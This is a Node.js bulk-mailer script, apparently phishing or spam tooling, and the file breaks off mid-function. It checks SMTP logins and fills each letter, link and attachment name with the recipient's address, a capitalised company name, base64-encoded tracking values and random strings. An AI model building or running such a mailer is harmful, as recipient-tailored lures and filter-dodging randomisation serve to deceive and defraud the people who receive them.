'use strict'; 
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const randomstring = require('randomstring');
const crypto = require('crypto');
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "1";
let count = 1;

function escapeTxt(os) {
    var ns = '';
    var t;
    var chr = '';
    var cc = '';
    var tn = '';
    for (let i = 0; i < 256; i++) {
        tn = i.toString(16);
        if (tn.length < 2) tn = "0" + tn;
        cc += tn;
        chr += unescape('%' + tn);
    }
    cc = cc.toUpperCase();
    os.replace(String.fromCharCode(13) + '', "%13");
    for (let q = 0; q < os.length; q++) {
        t = os.substr(q, 1);
        for (let i = 0; i < chr.length; i++) {
            if (t == chr.substr(i, 1)) {
                t = t.replace(chr.substr(i, 1), "%" + cc.substr(i * 2, 2));
                i = chr.length;
            }
        }
        ns += t;
    }
    return ns;
}

async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            }
        });
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFilename(filename, email, timezone) {
    try {
        filename = filename.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        filename = filename.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        filename = filename.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        filename = filename.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        filename = filename.replace(/DAY/g, timezoneSet(timezone, "d"));
        filename = filename.replace(/MONTH/g, timezoneSet(timezone, "m"));
        filename = filename.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        filename = filename.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        filename = filename.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        filename = filename.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        filename = filename.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        filename = filename.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        filename = filename.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        filename = filename.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        filename = filename.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        filename = filename.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        filename = filename.replace(/XXXEMAIL/g, email);
        filename = filename.replace(/MD5/g, crypto.createHash('md5').update(email).digest('hex'));
        filename = filename.replace(/1CHAR1/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        filename = filename.replace(/2CHAR2/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        filename = filename.replace(/3CHAR3/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        filename = filename.replace(/4CHAR4/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        filename = filename.replace(/5CHAR5/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        filename = filename.replace(/6CHAR6/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        filename = filename.replace(/7CHAR7/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        filename = filename.replace(/8CHAR8/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        filename = filename.replace(/9CHAR9/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        filename = filename.replace(/CHAR10/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        filename = filename.replace(/CHAR20/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        filename = filename.replace(/1NUMBER1/g, randomstring.generate({length: 1, charset: 'numeric'}));
        filename = filename.replace(/2NUMBER2/g, randomstring.generate({length: 2, charset: 'numeric'}));
        filename = filename.replace(/3NUMBER3/g, randomstring.generate({length: 3, charset: 'numeric'}));
        filename = filename.replace(/4NUMBER4/g, randomstring.generate({length: 4, charset: 'numeric'}));
        filename = filename.replace(/5NUMBER5/g, randomstring.generate({length: 5, charset: 'numeric'}));
        filename = filename.replace(/6NUMBER6/g, randomstring.generate({length: 6, charset: 'numeric'}));
        filename = filename.replace(/7NUMBER7/g, randomstring.generate({length: 7, charset: 'numeric'}));
        filename = filename.replace(/8NUMBER8/g, randomstring.generate({length: 8, charset: 'numeric'}));
        filename = filename.replace(/9NUMBER9/g, randomstring.generate({length: 9, charset: 'numeric'}));
        filename = filename.replace(/NUMBER10/g, randomstring.generate({length: 10, charset: 'numeric'}));
        filename = filename.replace(/NUMBER20/g, randomstring.generate({length: 20, charset: 'numeric'}));
        return Promise.resolve(filename);
    } catch(err) {
        return Promise.reject(err);
    }
}

async function readFrom(from, email, timezone) {
    try {
        from = from.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        from = from.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        from = from.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        from = from.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        from = from.replace(/DAY/g, timezoneSet(timezone, "d"));
        from = from.replace(/MONTH/g, timezoneSet(timezone, "m"));
        from = from.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        from = from.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        from = from.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        from = from.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        from = from.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        from = from.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        from = from.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        from = from.replace(/XXXEMAIL/g, email);
        from = from.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        from = from.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        from = from.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        from = from.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        from = from.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        from = from.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        from = from.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        from = from.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        from = from.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        from = from.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        from = from.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        from = from.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        from = from.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        from = from.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        from = from.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        from = from.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        from = from.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        from = from.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        from = from.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        from = from.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        from = from.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        from = from.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        from = from.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

function timezoneSet(timezone, get) {
    let nDate;
    const obj = {
        timeZone: timezone
    };
    if(get == "H") {
        obj.hour = '2-digit';
        obj.hour12 = false;
    } else if(get == "h") {
        obj.hour = '2-digit';
    } else if(get == "i") {
        obj.minute = '2-digit';
    } else if(get == "s") {
        obj.second = '2-digit';
    } else if(get == "d") {
        obj.day = 'numeric';
    } else if(get == "d") {
        obj.weekday = 'long';
    } else if(get == "m") {
        obj.month = 'long';
    } else if(get == "Y") {
        obj.year = 'numeric';
    } else if(get == "full") {
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        } else if(get == "full2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    } else if(get == "jdate") {
        obj.weekday = 'short';
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
    } else if(get == "jdate2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
    } else if(get == "fulltime24") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        obj.hour12 = false;
    } else if(get == "fulltime12") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    }
    nDate = new Date().toLocaleString('en-us', obj);
    return nDate;
}
async function readLetter(letter, email, timezone, base_href, randomlinks) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        sletter = sletter.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        sletter = sletter.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/DAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/MONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        sletter = sletter.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        sletter = sletter.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        sletter = sletter.replace(/XXXEMAIL/g, email);
        sletter = sletter.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        sletter = sletter.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        sletter = sletter.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        sletter = sletter.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        sletter = sletter.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        sletter = sletter.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        sletter = sletter.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        sletter = sletter.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        sletter = sletter.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        sletter = sletter.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        sletter = sletter.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        sletter = sletter.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        sletter = sletter.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        sletter = sletter.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        sletter = sletter.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        sletter = sletter.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        sletter = sletter.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        sletter = sletter.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        sletter = sletter.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        sletter = sletter.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        sletter = sletter.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        sletter = sletter.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        sletter = sletter.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        randomlinks = randomlinks.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        randomlinks = randomlinks.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        randomlinks = randomlinks.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        randomlinks = randomlinks.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        randomlinks = randomlinks.replace(/DAY/g, timezoneSet(timezone, "d"));
        randomlinks = randomlinks.replace(/MONTH/g, timezoneSet(timezone, "m"));
        randomlinks = randomlinks.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        randomlinks = randomlinks.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        randomlinks = randomlinks.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        randomlinks = randomlinks.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        randomlinks = randomlinks.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        randomlinks = randomlinks.replace(/XXXEMAIL/g, email);
        randomlinks = randomlinks.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        randomlinks = randomlinks.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        randomlinks = randomlinks.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        randomlinks = randomlinks.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        randomlinks = randomlinks.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        randomlinks = randomlinks.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        randomlinks = randomlinks.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        randomlinks = randomlinks.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        base_href = base_href.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        base_href = base_href.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        base_href = base_href.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        base_href = base_href.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        base_href = base_href.replace(/DAY/g, timezoneSet(timezone, "d"));
        base_href = base_href.replace(/MONTH/g, timezoneSet(timezone, "m"));
        base_href = base_href.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        base_href = base_href.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        base_href = base_href.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        base_href = base_href.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        base_href = base_href.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        base_href = base_href.replace(/XXXEMAIL/g, email);
        base_href = base_href.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        base_href = base_href.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        base_href = base_href.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        base_href = base_href.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        base_href = base_href.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        base_href = base_href.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        base_href = base_href.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        base_href = base_href.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        base_href = base_href.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        base_href = base_href.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        base_href = base_href.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        base_href = base_href.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        base_href = base_href.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        base_href = base_href.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        base_href = base_href.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        base_href = base_href.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        base_href = base_href.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        base_href = base_href.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        base_href = base_href.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        base_href = base_href.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        base_href = base_href.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        base_href = base_href.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        base_href = base_href.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        base_href = base_href.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        base_href = base_href.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        base_href = base_href.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        base_href = base_href.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        base_href = base_href.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        sletter = sletter.replace(/RANDOMLINK/g, randomlinks);
        sletter = sletter.replace(/RANDOMBASELINK/g, Buffer.from(randomlinks).toString('base64'));
        sletter = sletter.replace(/BASEURL/g, Buffer.from(base_href).toString('base64'));
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}



async function readLetterAttachments(letter, email, timezone, base_href, randomlinks) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/HOUR24/g, timezoneSet(timezone, "H"));
        sletter = sletter.replace(/HOUR12/g, timezoneSet(timezone, "h"));
        sletter = sletter.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/DAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/MONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/XXXEMAIL/g, email);
        sletter = sletter.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        sletter = sletter.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        sletter = sletter.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        sletter = sletter.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        sletter = sletter.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        sletter = sletter.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        sletter = sletter.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        sletter = sletter.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        sletter = sletter.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        sletter = sletter.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        sletter = sletter.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        sletter = sletter.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        sletter = sletter.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        sletter = sletter.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        sletter = sletter.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        sletter = sletter.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        sletter = sletter.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        sletter = sletter.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        sletter = sletter.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        sletter = sletter.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        sletter = sletter.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        sletter = sletter.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        sletter = sletter.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        base_href = base_href.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        base_href = base_href.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        base_href = base_href.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        base_href = base_href.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        base_href = base_href.replace(/DAY/g, timezoneSet(timezone, "d"));
        base_href = base_href.replace(/MONTH/g, timezoneSet(timezone, "m"));
        base_href = base_href.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        base_href = base_href.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        base_href = base_href.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        base_href = base_href.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        base_href = base_href.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        base_href = base_href.replace(/XXXEMAIL/g, email);
        base_href = base_href.replace(/MD5/g, crypto.randomBytes(16).toString('hex'));
        base_href = base_href.replace(/BASE64EMAIL/g, Buffer.from(email).toString('base64'));
        base_href = base_href.replace(/1CHAR/g, randomstring.generate({length: 1, charset: 'alphanumeric'}));
        base_href = base_href.replace(/2CHAR/g, randomstring.generate({length: 2, charset: 'alphanumeric'}));
        base_href = base_href.replace(/3CHAR/g, randomstring.generate({length: 3, charset: 'alphanumeric'}));
        base_href = base_href.replace(/4CHAR/g, randomstring.generate({length: 4, charset: 'alphanumeric'}));
        base_href = base_href.replace(/5CHAR/g, randomstring.generate({length: 5, charset: 'alphanumeric'}));
        base_href = base_href.replace(/6CHAR/g, randomstring.generate({length: 6, charset: 'alphanumeric'}));
        base_href = base_href.replace(/7CHAR/g, randomstring.generate({length: 7, charset: 'alphanumeric'}));
        base_href = base_href.replace(/8CHAR/g, randomstring.generate({length: 8, charset: 'alphanumeric'}));
        base_href = base_href.replace(/9CHAR/g, randomstring.generate({length: 9, charset: 'alphanumeric'}));
        base_href = base_href.replace(/10CHAR/g, randomstring.generate({length: 10, charset: 'alphanumeric'}));
        base_href = base_href.replace(/20CHAR/g, randomstring.generate({length: 20, charset: 'alphanumeric'}));
        base_href = base_href.replace(/1NUMBER/g, randomstring.generate({length: 1, charset: 'numeric'}));
        base_href = base_href.replace(/2NUMBER/g, randomstring.generate({length: 2, charset: 'numeric'}));
        base_href = base_href.replace(/3NUMBER/g, randomstring.generate({length: 3, charset: 'numeric'}));
        base_href = base_href.replace(/4NUMBER/g, randomstring.generate({length: 4, charset: 'numeric'}));
        base_href = base_href.replace(/5NUMBER/g, randomstring.generate({length: 5, charset: 'numeric'}));
        base_href = base_href.replace(/6NUMBER/g, randomstring.generate({length: 6, charset: 'numeric'}));
        base_href = base_href.replace(/7NUMBER/g, randomstring.generate({length: 7, charset: 'numeric'}));
        base_href = base_href.replace(/8NUMBER/g, randomstring.generate({length: 8, charset: 'numeric'}));
        base_href = base_href.replace(/9NUMBER/g, randomstring.generate({length: 9, charset: 'numeric'}));
        base_href = base_href.replace(/10NUMBER/g, randomstring.generate({length: 10, charset: 'numeric'}));
        base_href = base_href.replace(/20NUMBER/g, randomstring.generate({length: 20, charset: 'numeric'}));
        base_href = base_href.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        base_href = base_href.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        base_href = base_href.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        base_href = base_href.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        sletter = sletter.replace(/RANDOMLINK/g, randomlinks);
        sletter = sletter.replace(/RANDOMBASELINK/g, Buffer.from(randomlinks).toString('base64'));
        sletter = sletter.replace(/BASEURL/g, Buffer.from(base_href).toString('base64'));
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readSubject(subject, email, timezone) {
    try {
        subject = subject.replace(/HOUR24/g, timezoneSet(timezone, "fulltime24"));
        subject = subject.replace(/HOUR12/g, timezoneSet(timezone, "fulltime12"));
        subject = subject.replace(/MINUTE/g, timezoneSet(timezone, "i"));
        subject = subject.replace(/SECONDS/g, timezoneSet(timezone, "s"));
        subject = subject.replace(/DAY/g, timezoneSet(timezone, "d"));
        subject = subject.replace(/MONTH/g, timezoneSet(timezone, "m"));
        subject = subject.replace(/YEAR/g, timezoneSet(timezone, "Y"));
        subject = subject.replace(/FULLDATE1/g, timezoneSet(timezone, "full"));
        subject = subject.replace(/FULLDATE2/g, timezoneSet(timezone, "full2"));
        subject = subject.replace(/DATEONLY1/g, timezoneSet(timezone, "jdate"));
        subject = subject.replace(/DATEONLY2/g, timezoneSet(timezone, "jdate2"));
        subject = subject.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        subject = subject.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        subject = subject.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        subject = subject.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        subject = subject.replace(/XXXEMAIL/g, email);
